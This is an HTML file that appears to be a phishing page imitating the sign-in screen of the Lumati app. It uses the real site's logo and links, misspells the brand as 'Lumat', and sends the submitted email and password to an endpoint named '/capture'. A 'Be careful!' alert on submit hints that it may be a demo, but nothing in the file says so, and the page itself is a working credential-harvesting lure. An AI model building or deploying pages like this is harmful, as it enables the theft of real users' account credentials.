


<!DOCTYPE html>
<html>
<head>
  <title>Lumat Login</title>
  <style>
    body {
    font-family: Arial, sans-serif;
    background-color: #121212;
    color: #fff;
    margin: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
  }
  
  .container {
    background-color: #181818;
    padding: 40px;
    border-radius: 10px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
    text-align: center;
  }
  
  img {
    width: 150px;
    margin-bottom: 20px;
  }
  
  form {
    display: flex;
    flex-direction: column;
  }
  
  input[type="email"], input[type="password"] {
    padding: 10px;
    margin-bottom: 15px;
    border: none;
    border-radius: 5px;
    background-color: #242424;
    color: #fff;
  }
  
  button {
    background-color: #2980b9;
    color: #fff;
    padding: 12px 20px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    transition: background-color 0.3s ease;
  }
  
  button:hover {
    background-color: #21618C;
  }
  
  .links {
    margin-top: 20px;
  }
  
  .links a {
    color: #999;
    text-decoration: none;
    margin: 0 10px;
  }
  
  .links a:hover {
    color: #fff;
  }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://dev-app.lumati.com/assets/icon/lumati-logo.gif" alt="Lumat Logo">
    <form action="/capture" method="POST">
      <input type="email" id="email" name="email" placeholder="Email" required>
      <input type="password" id="password" name="password" placeholder="Password" required>
      <button type="submit" onclick="window.alert('Be careful!')">Sign In</button>
    </form>
    <div class="links">
      <a href="https://dev-app.lumati.com/sign-up-with-email">Forgot password?</a>
      <a href="">Don't have an account?</a>
    </div>
  </div>
</body>
</html>
